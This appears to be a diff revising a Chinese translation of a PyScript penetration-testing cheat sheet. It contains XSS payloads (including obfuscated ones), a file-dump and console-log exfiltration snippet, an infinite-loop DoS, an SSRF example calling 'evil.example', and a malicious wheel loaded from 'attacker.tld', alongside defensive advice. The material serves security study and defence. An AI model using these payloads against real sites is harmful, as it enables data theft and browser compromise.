@@ -1,14 +1,12 @@
 # Pyscript
 
-{{#include ../../banners/hacktricks-training.md}}
+## PyScript Pentesting 指南
 
-## PyScript Pentesting Guide
+PyScript 是一个用于将 Python 集成到 HTML 中的新框架，因此可以与 HTML 一起使用。在此 cheat sheet 中，你将了解如何将 PyScript 用于 penetration testing。
 
-PyScript 是一个用于将 Python 集成到 HTML 中的新 framework，因此可以与 HTML 一起使用。在这份 cheat sheet 中，你将了解如何将 PyScript 用于 pentesting。
+### 从 Emscripten 虚拟内存文件系统 Dump / Retrieving 文件：
 
-### 从 Emscripten 虚拟内存文件系统中 Dumping / Retrieving 文件：
-
-`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
+`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
 \
 代码：
 ```html
@@ -19,11 +17,11 @@ with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
 ```
 结果：
 
-![PyScript Pentesting Guide - 从 Emscripten 虚拟内存文件系统中转储/检索文件：= fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)
+![PyScript Pentesting 指南 - 从 Emscripten 虚拟内存文件系统转储/检索文件：= fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)
 
-### [Emscripten 虚拟内存文件系统的 OOB 数据外传（控制台监控）](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)
+### [Emscripten 虚拟内存文件系统的 OOB 数据外泄（控制台监控）](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)
 
-`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
+`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
 \
 代码：
 ```html
@@ -49,9 +47,9 @@ body: JSON.stringify({ content: btoa(console.logs) }),
 ```
 结果：
 
-![从 Emscripten 虚拟内存文件系统转储/检索文件 - Emscripten 虚拟内存文件系统的数据外带（控制台监控）：Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)
+![从 Emscripten 虚拟内存文件系统转储 / 获取文件 - Emscripten 虚拟内存文件系统的 OOB Data Exfiltration（控制台监控）：Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)
 
-### Cross Site Scripting（普通）
+### Cross Site Scripting (Ordinary)
 
 代码：
 ```python
@@ -61,7 +59,7 @@ print("<img src=x onerror='alert(document.domain)'>")
 ```
 结果：
 
-![OOB Data Exfiltration of the Emscripten virtual memory filesystem（console monitoring）- Cross Site Scripting (Ordinary)：Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
+![OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
 
 ### Cross Site Scripting (Python Obfuscated)
 
@@ -77,13 +75,13 @@ y = "o";m = "ner";z = "ror\u003d"
 print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
 </py-script>
 ```
-结果：
+Result:
 
 ![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)
 
 ### Cross Site Scripting (JavaScript Obfuscation)
 
-代码：
+代码:
 ```html
 <py-script>
 prinht(""
@@ -157,7 +155,7 @@ Result:
 
 ### DoS attack (Infinity loop)
 
-代码:
+代码：
 ```html
 <py-script>
 while True:
@@ -172,36 +170,41 @@ print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
 
 ## 新漏洞与技术（2023-2025）
 
-### Server-Side Request Forgery via uncontrolled redirects (CVE-2025-50182)
+### 通过不受控制的重定向实现 Server-Side Request Forgery（CVE-2025-50182）
 
-`urllib3 < 2.5.0` 在 PyScript 随附的 **Pyodide runtime** 中执行时，会忽略 `redirect` 和 `retries` 参数。当攻击者能够影响目标 URL 时，即使开发者明确禁用了 redirect，他们仍可能强制 Python code 跟随跨域 redirect——从而有效绕过 anti-SSRF logic。<sup>[[1]](#references)</sup>
+`urllib3 >= 2.2.0, < 2.5.0` 在与 Pyodide 的浏览器传输一起使用时，会忽略 `redirect` 和 `retries` 请求参数。如果攻击者能够影响目标 URL，即使代码要求 urllib3 禁用重定向，它仍可能跟随跨域重定向，从而削弱 SSRF 防御措施。<sup>[[1]](#references)[[4]](#references)</sup>
 ```html
 <script type="py">
 import urllib3
-http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
-r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
+http = urllib3.PoolManager()
+r = http.request(
+"GET",
+"https://evil.example/302",
+retries=False,
+redirect=False,
+)  # ignored by affected Pyodide/browser runtimes
 print(r.status, r.url)
 </script>
 ```
-已在 `urllib3 2.5.0` 中修复——请升级 PyScript image 中的 package，或在 `packages = ["urllib3>=2.5.0"]` 中固定安全版本。详情请参阅官方 CVE 条目。
+将 Node.js 的 `urllib3` 升级到 `>= 2.5.0`，但不要依赖 `urllib3` 在浏览器中禁用重定向；应在发起请求前验证目标，或将目标加入 allow-list。<sup>[[4]](#references)</sup>
 
-### 任意 package 加载与 supply-chain attacks
+### 任意 package 加载与供应链攻击
 
-由于 PyScript 允许在 `packages` 列表中使用任意 URLs，能够修改或注入配置的恶意攻击者可以在受害者的 browser 中执行**完全任意的 Python**：
+PyScript 的 Pyodide 配置接受任意 wheel URL 作为 `packages`；如果攻击者能够修改或注入该配置，后续的 import 便可在受害者的浏览器中执行攻击者控制的 Python 代码。<sup>[[5]](#references)[[6]](#references)</sup>
 ```html
 <py-config>
 packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
 </py-config>
 <script type="py">
-import payload  # executes attacker-controlled code during installation
+import payload  # executes attacker-controlled code at import
 </script>
 ```
-*仅需要 pure-Python wheels —— 不需要 WebAssembly compilation step。确保 configuration 不受 user 控制，并在你自己的 domain 上通过 HTTPS 托管 trusted wheels，同时使用 SRI hashes。
+Pyodide 可以从任意 URL 安装 pure-Python wheels，而无需对该 package 进行 WebAssembly 构建。<sup>[[6]](#references)</sup> 请确保此配置由开发者控制，仅允许 exact package names 或 URLs，并在构建或部署期间验证远程 wheel 的 digest。
 
 ### Output sanitisation changes (2023+)
 
-* `print()` 仍会注入 raw HTML，因此存在 XSS 风险（如上例所示）。
-* 较新的 `display()` helper 默认会对 HTML 进行 escaping —— 必须将 raw markup 包装在 `pyscript.HTML()` 中。
+* 在 legacy examples 使用的 2022.05.1 implementation 中，`print()` 写入 `text/plain` output 时不会进行 HTML escaping，因此容易受到 XSS 攻击。<sup>[[8]](#references)</sup>
+* 当前的 `display()` helper 默认会对 plain strings 进行 **HTML escaping**；原始 markup 必须使用 `pyscript.HTML()` 包装。<sup>[[2]](#references)</sup>
 ```python
 from pyscript import display, HTML
 
@@ -209,22 +212,26 @@ display("<b>escaped</b>")          # renders literally
 
 display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
 ```
-此行为于 2023 年引入，并记录在官方 Built-ins 指南中。对于不受信任的输入，应依赖 `display()`，避免直接调用 `print()`。<sup>[[2]](#references)</sup>
+对不可信输入使用 `display()`，不要将不可信字符串传递给 `HTML()`。<sup>[[2]](#references)</sup>
 
 ---
 
 ## 防御最佳实践
 
-* **保持 packages 为最新版本** – 升级到 `urllib3 >= 2.5.0`，并定期重新构建随站点提供的 wheels。
-* **限制 package 来源** – 仅引用 PyPI 名称或同源 URL，最好使用 Sub-resource Integrity (SRI) 进行保护。
-* **强化 Content Security Policy** – 禁止 inline JavaScript（`script-src 'self' 'sha256-…'`），使注入的 `<script>` 块无法执行。
-* **禁止用户提供 `<py-script>` / `<script type="py">` 标签** – 在服务器端对 HTML 进行清理，然后再将其回显给其他用户。
-* **隔离 workers** – 如果不需要从 workers 同步访问 DOM，请启用 `sync_main_only` 标志，以避免 `SharedArrayBuffer` 的 header 要求。
+* **保持 packages 为最新版本** – 在 Node.js 中使用 `urllib3 >= 2.5.0`，并单独审查浏览器重定向假设。<sup>[[4]](#references)</sup>
+* **限制 package 来源** – 将 PyPI 名称或确切的受信任 URL 加入 allow-list，并在构建或部署期间验证远程 wheel 的摘要。<sup>[[5]](#references)[[6]](#references)</sup>
+* **强化 Content Security Policy** – 禁止 inline JavaScript（`script-src 'self' 'sha256-…'`），以防止注入的 `<script>` 块执行。
+* **禁止用户提供 `<py-script>` / `<script type="py">` 标签** – 在将 HTML 回显给其他用户之前，在服务器上对其进行 sanitise。
+* **隔离 worker** – 如果不需要从 worker 同步访问 DOM，请启用 `sync_main_only` flag，以避免使用 `SharedArrayBuffer` 及其相关的 CORS header 要求。<sup>[[5]](#references)</sup>
 
-## 参考资料
+## References
 
 - [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
 - [2] [PyScript Built-ins 文档 – `display` 与 `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
-- [3] [Cyber Guy - The Art of Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
-
+- [3] [Cyber Guy - Vulnerability Chaining 艺术（PyScript）](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
+- [4] [urllib3 security advisory – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
+- [5] [PyScript 配置文档 – packages 与 `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
+- [6] [Pyodide – 加载 packages](https://pyodide.org/en/stable/usage/loading-packages.html)
+- [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
+- [8] [PyScript 2022.05.1 `pyscript.py` 实现](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
 {{#include ../../banners/hacktricks-training.md}}
